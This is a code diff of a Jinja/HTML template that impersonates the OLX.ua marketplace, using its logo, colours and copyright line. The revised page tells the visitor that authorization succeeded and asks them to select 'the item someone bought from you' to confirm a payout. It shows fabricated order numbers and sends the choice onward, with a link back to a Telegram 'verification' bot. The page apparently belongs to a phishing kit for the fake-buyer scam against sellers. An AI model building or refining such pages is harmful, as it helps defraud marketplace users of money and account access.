@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Авторизація успішна — OLX.ua</title>
+    <title>Підтвердження продажу — OLX.ua</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 
     <style>
@@ -12,249 +12,216 @@
             --olx-bg: #f2f4f5;
             --olx-cyan: #23E5DB;
             --olx-red: #ff5636;
-            --olx-green: #27ae60;
+            --olx-border: #edeff0;
+            --olx-text-gray: #7f9799;
         }
 
         body {
             margin: 0;
             font-family: 'Roboto', sans-serif;
             background-color: var(--olx-bg);
+            color: var(--olx-dark);
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
         }
 
         header {
             background-color: var(--olx-dark);
-            height: 72px;
+            height: 64px;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 0 16px;
-            width: 100%;
-            box-sizing: border-box;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
         main {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
+            max-width: 960px;
+            margin: 0 auto;
+            padding: 24px 16px;
         }
 
-        .container {
-            background: white;
-            width: 100%;
-            max-width: 440px;
-            padding: 35px 25px;
-            border-radius: 16px;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.12);
+        .page-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
             text-align: center;
-            animation: fadeIn .6s ease;
-            box-sizing: border-box;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px) }
-            to { opacity: 1; transform: translateY(0) }
+        .instruction-box {
+            background: white;
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 24px;
+            border-left: 4px solid var(--olx-cyan);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            text-align: center;
         }
 
-        .verify-badge {
-            background: #fff0ee;
-            color: var(--olx-red);
-            font-size: 13px;
-            font-weight: 700;
-            padding: 8px 16px;
-            border-radius: 20px;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 20px;
-            border: 1px solid #ffdbd6;
-        }
-
-        .checkmark {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            background: #27ae60;
-            margin: 0 auto 15px;
+        /* --- СТИЛЬ КАРТОК ЯК НА СКРІНШОТІ --- */
+        .ads-container {
             display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .checkmark svg {
-            width: 30px;
-            height: 30px;
-            stroke: white;
-            stroke-width: 4;
-            fill: none;
-        }
-
-        h1 { font-size: 22px; margin: 10px 0; color: #1f2d3d; }
-        
-        .instruction-text { 
-            color: #5f6c7b; 
-            font-size: 15px; 
-            margin-bottom: 25px; 
-            line-height: 1.5; 
-        }
-        
-        .highlight { 
-            color: var(--olx-dark); 
-            font-weight: 700; 
-            background: linear-gradient(180deg,transparent 70%, #23e5db4d 0);
-        }
-
-        .ads-section {
-            text-align: left;
-            margin-bottom: 25px;
-            border-top: 1px solid #f2f4f5;
-            padding-top: 15px;
-        }
-
-        .ads-title {
-            font-size: 13px;
-            font-weight: 700;
-            color: #7f9799;
-            text-transform: uppercase;
-            margin-bottom: 12px;
-        }
-
-        /* Улучшенные карточки объявлений */
-        .ad-card {
-            display: flex;
-            align-items: center;
-            background: #ffffff;
-            border: 2px solid #edeff0;
-            border-radius: 12px;
-            padding: 12px;
-            margin-bottom: 10px;
+            flex-direction: column;
             gap: 12px;
-            cursor: pointer;
-            transition: all 0.2s ease-in-out;
+        }
+
+        .ad-card {
+            background: white;
+            border-radius: 4px;
+            padding: 16px;
+            display: flex;
             position: relative;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: 2px solid transparent;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
 
         .ad-card:hover {
-            border-color: #ced4d7;
-            background: #f8f9fa;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
 
-        /* Состояние выбора */
         .ad-card.selected {
-            border: 2px solid var(--olx-dark) !important;
-            background: #f0fdfc;
-            box-shadow: 0 4px 12px rgba(0, 47, 52, 0.08);
+            border-color: var(--olx-cyan);
+            background: #faffff;
         }
 
-        /* Кастомный индикатор выбора (радио-кнопка) */
-        .ad-card::after {
-            content: '';
-            width: 20px;
-            height: 20px;
-            border: 2px solid #ced4d7;
-            border-radius: 50%;
-            margin-left: auto;
-            transition: all 0.2s;
+        .ad-image-wrapper {
+            width: 100px;
+            height: 100px;
             flex-shrink: 0;
-        }
-
-        .ad-card.selected::after {
-            border-color: var(--olx-dark);
-            background: var(--olx-dark);
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='4' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='20 6 9 17 4 12'%3E%3C/polyline%3E%3C/svg%3E");
-            background-size: 12px;
-            background-repeat: no-repeat;
-            background-position: center;
+            margin-right: 16px;
+            background: #f8f9fa;
+            border-radius: 4px;
+            overflow: hidden;
         }
 
         .ad-img {
-            width: 44px;
-            height: 44px;
-            object-fit: cover;
-            border-radius: 8px;
-            background: white;
-            border: 1px solid #eef0f1;
-        }
-
-        .ad-info { flex: 1; min-width: 0; }
-        .ad-name {
-            font-size: 14px;
-            font-weight: 500;
-            color: var(--olx-dark);
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            margin-bottom: 2px;
-        }
-
-        .ad-status {
-            font-size: 11px;
-            color: #27ae60;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        #hidden-ads { display: none; }
-
-        .toggle-btn {
-            background: none; border: none; color: var(--olx-dark);
-            font-weight: 700; font-size: 13px; cursor: pointer;
-            display: flex; align-items: center; justify-content: center;
-            width: 100%; gap: 5px; padding: 10px 0;
-        }
-        
-        .toggle-btn svg { transition: transform 0.3s ease; }
-        .toggle-btn.active svg { transform: rotate(180deg); }
-
-        .btn {
-            display: block;
             width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .ad-content {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .ad-header-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .ad-name {
+            font-size: 18px;
+            font-weight: 700;
+            margin: 0 0 12px 0;
+            max-width: 70%;
+        }
+
+        .ad-price {
+            font-size: 18px;
+            font-weight: 700;
+            white-space: nowrap;
+        }
+
+        /* Рожевий бейдж статусу */
+        .status-badge {
+            background-color: #fde0d8;
+            color: #000;
+            padding: 8px 12px;
+            border-radius: 4px;
+            display: inline-block;
+            font-size: 12px;
+            font-weight: 700;
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 8px;
+        }
+
+        .ad-card.selected .status-badge {
+            background-color: var(--olx-cyan);
+            color: var(--olx-dark);
+        }
+
+        .ad-footer-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            margin-top: auto;
+        }
+
+        .ad-meta-info {
+            font-size: 13px;
+            color: var(--olx-text-gray);
+            display: flex;
+            gap: 16px;
+        }
+
+        .open-btn {
+            font-size: 14px;
+            font-weight: 700;
+            text-decoration: underline;
+            color: var(--olx-dark);
+            cursor: pointer;
+        }
+
+        /* Кнопки внизу */
+        .bottom-actions {
+            margin-top: 32px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .btn-main {
+            width: 100%;
+            max-width: 400px;
             padding: 16px;
-            background: var(--olx-dark);
+            background: #9aa7b3;
             color: white;
             font-weight: 700;
-            border-radius: 10px;
-            text-decoration: none;
-            box-sizing: border-box;
             border: none;
+            border-radius: 4px;
             font-size: 16px;
-            margin-bottom: 12px;
+            cursor: not-allowed;
             transition: 0.3s;
         }
 
-        .btn-confirm {
-            background: #9aa7b3;
-            cursor: not-allowed;
-        }
-
-        .btn-confirm.active {
+        .btn-main.active {
             background: var(--olx-dark);
             cursor: pointer;
-            box-shadow: 0 6px 20px rgba(0, 47, 52, 0.25);
+            box-shadow: 0 4px 12px rgba(0, 47, 52, 0.2);
         }
 
-        .btn-secondary {
-            background: transparent;
-            color: #5f6c7b;
-            font-size: 14px;
+        .btn-link {
+            color: var(--olx-text-gray);
             text-decoration: underline;
-            box-shadow: none;
-            margin-top: 5px;
+            font-size: 14px;
+            background: none;
+            border: none;
+            cursor: pointer;
         }
 
-        .footer-text { margin-top: 25px; font-size: 11px; color: #9aa7b3; }
+        #hidden-ads { display: none; }
         
-        /* Skeleton styling */
+        @media (max-width: 600px) {
+            .ad-card { flex-direction: column; }
+            .ad-image-wrapper { width: 100%; height: 160px; margin-bottom: 12px; }
+            .ad-header-row { flex-direction: column; }
+            .ad-price { margin-top: 4px; margin-bottom: 12px; }
+            .ad-meta-info { flex-direction: column; gap: 4px; }
+        }
+
+        /* Skeleton */
         .skeleton {
             background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
             background-size: 200% 100%;
             animation: loading 1.5s infinite;
-            border-radius: 4px;
         }
         @keyframes loading {
             0% { background-position: 200% 0; }
@@ -266,87 +233,103 @@
 <body>
 
 <header>
-    <div class="header-container">
-        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="37" viewBox="0 0 64 37" fill="none">
-            <path d="M42.6667 0V37H33.5253V0H42.6667ZM15.2427 3.07524C23.6587 3.07524 30.4853 9.98104 30.4853 18.4946C30.4853 27.0082 23.6587 33.914 15.2427 33.914C6.82667 33.914 0 27.0082 0 18.4946C0 9.98104 6.82667 3.07524 15.2427 3.07524ZM52.1813 9.2473L54.8587 11.9557L57.536 9.2473H64V15.7862L61.3227 18.4946L64 21.203V27.7419H57.536L54.8587 25.0335L52.1813 27.7419H45.7173V21.203L48.3947 18.4946L45.7173 15.7862V9.2473H52.1813ZM15.2427 12.3333C11.8827 12.3333 9.152 15.0957 9.152 18.4946C9.152 21.8936 11.8827 24.6559 15.2427 24.6559C18.6027 24.6559 21.3333 21.8936 21.3333 18.4946C21.3333 15.0957 18.6027 12.3333 15.2427 12.3333Z" fill="#23E5DB"></path>
-        </svg>
-    </div>
+    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="37" viewBox="0 0 64 37" fill="none">
+        <path d="M42.6667 0V37H33.5253V0H42.6667ZM15.2427 3.07524C23.6587 3.07524 30.4853 9.98104 30.4853 18.4946C30.4853 27.0082 23.6587 33.914 15.2427 33.914C6.82667 33.914 0 27.0082 0 18.4946C0 9.98104 6.82667 3.07524 15.2427 3.07524ZM52.1813 9.2473L54.8587 11.9557L57.536 9.2473H64V15.7862L61.3227 18.4946L64 21.203V27.7419H57.536L54.8587 25.0335L52.1813 27.7419H45.7173V21.203L48.3947 18.4946L45.7173 15.7862V9.2473H52.1813ZM15.2427 12.3333C11.8827 12.3333 9.152 15.0957 9.152 18.4946C9.152 21.8936 11.8827 24.6559 15.2427 24.6559C18.6027 24.6559 21.3333 21.8936 21.3333 18.4946C21.3333 15.0957 18.6027 12.3333 15.2427 12.3333Z" fill="#23E5DB"></path>
+    </svg>
 </header>
 
 <main>
-    <div class="container">
-        <div class="verify-badge">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
-            Обліковий запис не верифікований
-        </div>
+    <div class="page-title">Авторизація успішна</div>
 
-        <div class="checkmark">
-            <svg viewBox="0 0 24 24"><polyline points="4,13 9,18 20,6"/></svg>
-        </div>
+    <div class="instruction-box">
+        Ваш профіль синхронізовано! <br>
+        Будь ласка, <b>виберіть товар, який у вас купили</b>, для підтвердження виплати:
+    </div>
 
-        <h1>Авторизація успішна</h1>
-        <p class="instruction-text" id="main-status">
-            {% if user_ads is defined and user_ads is not none %}
-                Ваш профіль синхронізовано! <br>
-                Будь ласка, <span class="highlight">натисніть на товар</span> для підтвердження:
-            {% else %}
-                Обробка даних профілю... <br>Будь ласка, зачекайте.
-            {% endif %}
-        </p>
+    <div class="ads-container" id="ads-container">
+        {% if user_ads is defined and user_ads is not none %}
+            {% if user_ads|length > 0 %}
+                {% for ad in user_ads[:3] %}
+                <div class="ad-card" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
+                    <div class="ad-image-wrapper">
+                        <img src="{{ ad.img }}" class="ad-img" alt="product">
+                    </div>
+                    <div class="ad-content">
+                        <div class="ad-header-row">
+                            <h2 class="ad-name">{{ ad.title }}</h2>
+                            <div class="ad-price">Обробка...</div>
+                        </div>
+                        <div class="status-badge">
+                            Очікує вибору <br>
+                            (натисніть для підтвердження)
+                        </div>
+                        <div class="ad-footer-row">
+                            <div class="ad-meta-info">
+                                <span>22.03.2026, 18:33</span>
+                                <span>Номер замовлення: 1145{{ loop.index }}94704</span>
+                            </div>
+                            <div class="open-btn">Відкрити</div>
+                        </div>
+                    </div>
+                </div>
+                {% endfor %}
 
-        <div class="ads-section">
-            <div class="ads-title">Ваші оголошення:</div>
-
-            <div id="ads-container">
-                {% if user_ads is defined and user_ads is not none %}
-                    {% if user_ads|length > 0 %}
-                        {% for ad in user_ads[:3] %}
-                        <div class="ad-card" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
-                            <img src="{{ ad.img }}" class="ad-img" alt="olx">
-                            <div class="ad-info">
-                                <div class="ad-name">{{ ad.title }}</div>
-                                <div class="ad-status">
-                                    <span style="width: 6px; height: 6px; background: #27ae60; border-radius: 50%;"></span>
-                                    Активне
+                {% if user_ads|length > 3 %}
+                <div id="hidden-ads">
+                    {% for ad in user_ads[3:] %}
+                    <div class="ad-card" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
+                        <div class="ad-image-wrapper">
+                            <img src="{{ ad.img }}" class="ad-img" alt="product">
+                        </div>
+                        <div class="ad-content">
+                            <div class="ad-header-row">
+                                <h2 class="ad-name">{{ ad.title }}</h2>
+                                <div class="ad-price">Обробка...</div>
+                            </div>
+                            <div class="status-badge">Очікує вибору</div>
+                            <div class="ad-footer-row">
+                                <div class="ad-meta-info">
+                                    <span>22.03.2026</span>
+                                    <span>Номер замовлення: 1145{{ loop.index + 3 }}94704</span>
                                 </div>
+                                <div class="open-btn">Відкрити</div>
                             </div>
                         </div>
-                        {% endfor %}
-
-                        {% if user_ads|length > 3 %}
-                        <div id="hidden-ads">
-                            {% for ad in user_ads[3:] %}
-                            <div class="ad-card" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
-                                <img src="{{ ad.img }}" class="ad-img" alt="olx">
-                                <div class="ad-info">
-                                    <div class="ad-name">{{ ad.title }}</div>
-                                    <div class="ad-status">
-                                        <span style="width: 6px; height: 6px; background: #27ae60; border-radius: 50%;"></span>
-                                        Активне
-                                    </div>
-                                </div>
-                            </div>
-                            {% endfor %}
-                        </div>
-                        <button class="toggle-btn" id="toggle-btn" onclick="toggleAds()">
-                            <span>Показати всі ({{ user_ads|length }})</span>
-                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
-                        </button>
-                        {% endif %}
-                    {% else %}
-                        <div class="no-ads-text">Активні оголошення не знайдені.</div>
-                    {% endif %}
-                {% else %}
-                    <div class="ad-card" style="opacity: 0.6;"><div class="skeleton" style="width:44px;height:44px"></div><div class="ad-info"><div class="skeleton" style="width:80%;height:12px;margin-bottom:6px"></div><div class="skeleton" style="width:40%;height:8px"></div></div></div>
-                    <div class="ad-card" style="opacity: 0.3;"><div class="skeleton" style="width:44px;height:44px"></div><div class="ad-info"><div class="skeleton" style="width:80%;height:12px;margin-bottom:6px"></div><div class="skeleton" style="width:40%;height:8px"></div></div></div>
+                    </div>
+                    {% endfor %}
+                </div>
+                <button class="btn-link" id="toggle-btn" onclick="toggleAds()" style="margin: 10px auto; display: block;">
+                    Показати всі ({{ user_ads|length }})
+                </button>
                 {% endif %}
+            {% else %}
+                <div style="text-align:center; padding: 40px;">Активні оголошення не знайдені.</div>
+            {% endif %}
+        {% else %}
+            <div class="ad-card" style="opacity: 0.7;">
+                <div class="ad-image-wrapper skeleton"></div>
+                <div class="ad-content">
+                    <div class="skeleton" style="height: 20px; width: 60%; margin-bottom: 10px;"></div>
+                    <div class="skeleton" style="height: 40px; width: 40%;"></div>
+                </div>
             </div>
-        </div>
+            <div class="ad-card" style="opacity: 0.4;">
+                <div class="ad-image-wrapper skeleton"></div>
+                <div class="ad-content">
+                    <div class="skeleton" style="height: 20px; width: 50%; margin-bottom: 10px;"></div>
+                    <div class="skeleton" style="height: 40px; width: 30%;"></div>
+                </div>
+            </div>
+        {% endif %}
+    </div>
 
-        <button id="confirm-btn" class="btn btn-confirm" onclick="submitSelection()" disabled>Підтвердити продаж</button>
-        <a href="https://t.me/olx_verif_bot" class="btn btn-secondary">Повернутися до бота</a>
+    <div class="bottom-actions">
+        <button id="confirm-btn" class="btn-main" onclick="submitSelection()" disabled>Підтвердити продаж</button>
+        <a href="https://t.me/olx_verif_bot" class="btn-link">Повернутися до бота</a>
+    </div>
 
-        <div class="footer-text">© OLX.UA 2026</div>
+    <div style="text-align: center; margin-top: 40px; color: var(--olx-text-gray); font-size: 11px;">
+        © OLX.UA 2026
     </div>
 </main>
 
@@ -354,8 +337,17 @@
 let selectedAdData = { url: "", title: "" };
 
 function selectAd(element, url, title) {
-    document.querySelectorAll('.ad-card').forEach(card => card.classList.remove('selected'));
+    // Скидаємо всі картки
+    document.querySelectorAll('.ad-card').forEach(card => {
+        card.classList.remove('selected');
+        const badge = card.querySelector('.status-badge');
+        if (badge) badge.innerHTML = "Очікує вибору <br> (натисніть для підтвердження)";
+    });
+
+    // Виділяємо поточну
     element.classList.add('selected');
+    const activeBadge = element.querySelector('.status-badge');
+    if (activeBadge) activeBadge.innerHTML = "ТОВАР ОБРАНО <br> Натисніть кнопку нижче";
 
     selectedAdData.url = url;
     selectedAdData.title = title;
@@ -369,7 +361,7 @@ async function submitSelection() {
     if (!selectedAdData.url) return;
     const btn = document.getElementById('confirm-btn');
     const originalText = btn.innerText;
-    
+
     btn.innerText = "Обробка...";
     btn.disabled = true;
 
@@ -402,17 +394,13 @@ async function submitSelection() {
 function toggleAds() {
     const hiddenContainer = document.getElementById('hidden-ads');
     const btn = document.getElementById('toggle-btn');
-    const span = btn.querySelector('span');
-    const totalCount = "{{ user_ads|length if user_ads else 0 }}";
-
+    
     if (hiddenContainer.style.display === 'block') {
         hiddenContainer.style.display = 'none';
-        span.innerText = `Показати всі (${totalCount})`;
-        btn.classList.remove('active');
+        btn.innerText = 'Показати всі';
     } else {
         hiddenContainer.style.display = 'block';
-        span.innerText = 'Сховати';
-        btn.classList.add('active');
+        btn.innerText = 'Сховати';
     }
 }
 
